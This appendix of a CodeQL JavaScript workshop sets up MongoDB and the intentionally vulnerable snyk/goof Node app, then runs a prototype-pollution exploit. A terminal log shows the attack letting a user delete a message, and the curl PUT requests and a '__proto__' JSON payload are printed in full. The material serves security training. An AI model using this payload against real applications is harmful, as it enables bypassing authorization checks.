docs/codeql/codeql-workshops/javascript/codeql-js-goof-workshop/workshop.html

<div id="outline-container-org4721eb6" class="outline-3">
<h3 id="org4721eb6"><span class="section-number-3">6.5</span> Appendix E: Complete Setup and Exploit of the snyk/goof Application</h3>
<div class="outline-text-3" id="text-6-5">
<p>
This is a concise setup and run of <a href="https://github.com/snyk/goof">snyk/goof</a>.  All steps are included for
completeness, but for the workshop we only need to collect the vulnerability
information.
</p>

<ol class="org-ol">
<li><p>
Install <a href="https://docs.mongodb.com/manual/tutorial/install-mongodb-on-os-x/#install-mongodb-community-edition">mongodb</a>
</p>
<div class="org-src-container">
<pre class="src src-sh"><span style="color: #b22222;"># </span><span style="color: #b22222;">Install</span>
brew tap mongodb/brew
brew install mongodb-community@4.4
</pre>
</div>
<p>
To have launchd start mongodb/brew/mongodb-community now and restart at login:
</p>
<pre class="example">
brew services start mongodb/brew/mongodb-community

</pre>
<p>
Or, if you don't want/need a background service you can just run:
</p>
<pre class="example">
mongod --config /usr/local/etc/mongod.conf

</pre>

<p>
Which is what we do:
</p>
<div class="org-src-container">
<pre class="src src-sh"><span style="color: #b22222;"># </span><span style="color: #b22222;">Run</span>
mongod --config /usr/local/etc/mongod.conf &amp;

<span style="color: #b22222;"># </span><span style="color: #b22222;">check log</span>
tail /usr/local/var/log/mongodb/mongo.log

<span style="color: #b22222;"># </span><span style="color: #b22222;">Connect and test</span>
mongo

<span style="color: #0000ff;">db.inventory.insertOne</span>(
   { item: <span style="color: #8b2252;">"canvas"</span>, qty: 100, tags: [<span style="color: #8b2252;">"cotton"</span>], size: { h: 28, w: 35.5, uom: <span style="color: #8b2252;">"cm"</span> } }
)

<span style="color: #0000ff;">db.inventory.find</span>( { item: <span style="color: #8b2252;">"canvas"</span> } )
</pre>
</div></li>

<li><p>
Install goof
</p>
<div class="org-src-container">
<pre class="src src-sh"><span style="color: #b22222;"># </span><span style="color: #b22222;">Clone</span>
<span style="color: #483d8b;">cd</span> ~/local
git clone https://github.com/Snyk/goof

<span style="color: #b22222;"># </span><span style="color: #b22222;">Build</span>
<span style="color: #483d8b;">cd</span> ~/local/goof
npm install

<span style="color: #b22222;"># </span><span style="color: #b22222;">...</span>
<span style="color: #b22222;"># </span><span style="color: #b22222;">found 253 vulnerabilities (153 low, 17 moderate, 82 high, 1 critical)</span>
<span style="color: #b22222;">#   </span><span style="color: #b22222;">run `npm audit fix` to fix them, or `npm audit` for details</span>
<span style="color: #b22222;"># </span><span style="color: #b22222;">...</span>
</pre>
</div></li>

<li><p>
Run goof
</p>
<div class="org-src-container">
<pre class="src src-sh"><span style="color: #b22222;"># </span><span style="color: #b22222;">Run mongodb</span>
mongod --config /usr/local/etc/mongod.conf &amp;

<span style="color: #b22222;"># </span><span style="color: #b22222;">Run goof</span>
<span style="color: #483d8b;">cd</span> ~/local/goof
npm start                       <span style="color: #b22222;"># </span><span style="color: #b22222;">follow logs here</span>
<span style="color: #b22222;"># </span><span style="color: #b22222;">or</span>
node app.js                     <span style="color: #b22222;"># </span><span style="color: #b22222;">from ~/local/goof/package.json</span>
open http://localhost:3001
</pre>
</div></li>

<li><p>
Try prototype-pollution exploits
</p>
<div class="org-src-container">
<pre class="src src-sh"><span style="color: #b22222;"># </span><span style="color: #b22222;">Check exploits</span>
bash
<span style="color: #483d8b;">.</span> ~/local/goof/exploits/prototype-pollution.sh

<span style="color: #b22222;"># </span><span style="color: #b22222;">Try c1 through c4 and exploit:</span>
List messages
        hohn@gh-hohn ~/local/goof/exploits
        0:$ c1
        []

Send some messages
        hohn@gh-hohn ~/local/goof/exploits
        0:$ c2
        {<span style="color: #8b2252;">"ok"</span>:true}
        hohn@gh-hohn ~/local/goof/exploits
        0:$ c2
        {<span style="color: #8b2252;">"ok"</span>:true}

List again
        hohn@gh-hohn ~/local/goof/exploits
        0:$ c1
        [{<span style="color: #8b2252;">"icon"</span>:<span style="color: #8b2252;">"&#128075;"</span>,<span style="color: #8b2252;">"text"</span>:<span style="color: #8b2252;">"Hi!"</span>,<span style="color: #8b2252;">"id"</span>:1,<span style="color: #8b2252;">"timestamp"</span>:1602276330967,<span style="color: #8b2252;">"userName"</span>:<span style="color: #8b2252;">"user"</span>},
         {<span style="color: #8b2252;">"icon"</span>:<span style="color: #8b2252;">"&#128075;"</span>,<span style="color: #8b2252;">"text"</span>:<span style="color: #8b2252;">"Hi!"</span>,<span style="color: #8b2252;">"id"</span>:2,<span style="color: #8b2252;">"timestamp"</span>:1602276331875,<span style="color: #8b2252;">"userName"</span>:<span style="color: #8b2252;">"user"</span>}]

Try to delete
        hohn@gh-hohn ~/local/goof/exploits
        0:$ c4
        {<span style="color: #8b2252;">"ok"</span>:false,<span style="color: #8b2252;">"error"</span>:<span style="color: #8b2252;">"Access denied"</span>}

Use exploit
        hohn@gh-hohn ~/local/goof/exploits
        0:$ c3
        {<span style="color: #8b2252;">"ok"</span>:true}

Try to delete again
        hohn@gh-hohn ~/local/goof/exploits
        130:$ c4
        {<span style="color: #8b2252;">"ok"</span>:true}

Notice message 1 is gone:
        hohn@gh-hohn ~/local/goof/exploits
        0:$ c1
        [{<span style="color: #8b2252;">"icon"</span>:<span style="color: #8b2252;">"&#128075;"</span>,<span style="color: #8b2252;">"text"</span>:<span style="color: #8b2252;">"Hi!"</span>,<span style="color: #8b2252;">"id"</span>:2,<span style="color: #8b2252;">"timestamp"</span>:1602276331875,<span style="color: #8b2252;">"userName"</span>:<span style="color: #8b2252;">"user"</span>},
         {<span style="color: #8b2252;">"icon"</span>:<span style="color: #8b2252;">"&#128075;"</span>,<span style="color: #8b2252;">"text"</span>:<span style="color: #8b2252;">"&#128520;"</span>,<span style="color: #8b2252;">"id"</span>:3,<span style="color: #8b2252;">"timestamp"</span>:1602276340962,<span style="color: #8b2252;">"userName"</span>:<span style="color: #8b2252;">"user"</span>}]
</pre>
</div></li>

<li><p>
The exploit's origin, or "What happened?"
</p>

<p>
The requests sent are
</p>
<div class="org-src-container">
<pre class="src src-sh">// c2, safe
{
    curl --request PUT <span style="color: #8b2252;">\</span>
      --url <span style="color: #8b2252;">"$GOOF_HOST/chat"</span> <span style="color: #8b2252;">\</span>
      --header <span style="color: #8b2252;">'content-type: application/json'</span> <span style="color: #8b2252;">\</span>
      --data <span style="color: #8b2252;">'{"auth": {"name": "user", "password": "pwd"}, "message": {"text": "Hi!"}}'</span>
}
// c3, the exploit:
{
    curl --request PUT <span style="color: #8b2252;">\</span>
      --url <span style="color: #8b2252;">"$GOOF_HOST/chat"</span> <span style="color: #8b2252;">\</span>
      --header <span style="color: #8b2252;">'content-type: application/json'</span> <span style="color: #8b2252;">\</span>
      --data <span style="color: #8b2252;">'{"auth": {"name": "user", "password": "pwd"}, </span>
<span style="color: #8b2252;">               "message": { "text": "&#128520;", "__proto__": {"canDelete": true}}}'</span>
}
</pre>
</div>

<p>
Both are PUT requests to the URL <code>$GOOF_HOST/chat</code>, but the json messages differ:
</p>
<div class="org-src-container">
<pre class="src src-javascript"><span style="color: #b22222;">// </span><span style="color: #b22222;">safe</span>
{<span style="color: #8b2252;">"auth"</span>: {<span style="color: #8b2252;">"name"</span>: <span style="color: #8b2252;">"user"</span>, <span style="color: #8b2252;">"password"</span>: <span style="color: #8b2252;">"pwd"</span>}, 
 <span style="color: #8b2252;">"message"</span>: {<span style="color: #8b2252;">"text"</span>: <span style="color: #8b2252;">"Hi!"</span>}}

<span style="color: #b22222;">// </span><span style="color: #b22222;">exploit</span>
{<span style="color: #8b2252;">"auth"</span>: {<span style="color: #8b2252;">"name"</span>: <span style="color: #8b2252;">"user"</span>, <span style="color: #8b2252;">"password"</span>: <span style="color: #8b2252;">"pwd"</span>}, 
 <span style="color: #8b2252;">"message"</span>: { <span style="color: #8b2252;">"text"</span>: <span style="color: #8b2252;">"&#128520;"</span>, <span style="color: #8b2252;">"__proto__"</span>: {<span style="color: #8b2252;">"canDelete"</span>: <span style="color: #008b8b;">true</span>}}}
</pre>
</div></li>
</ol>




</div>
</div>
</div>
</div>
</div>
<div id="postamble" class="status">
<p class="author">Author: Michael Hohn</p>
<p class="date">Created: 2020-10-20 Tue 15:19</p>
<p class="validation"><a href="http://validator.w3.org/check?uri=referer">Validate</a></p>
</div>
</body>
</html>
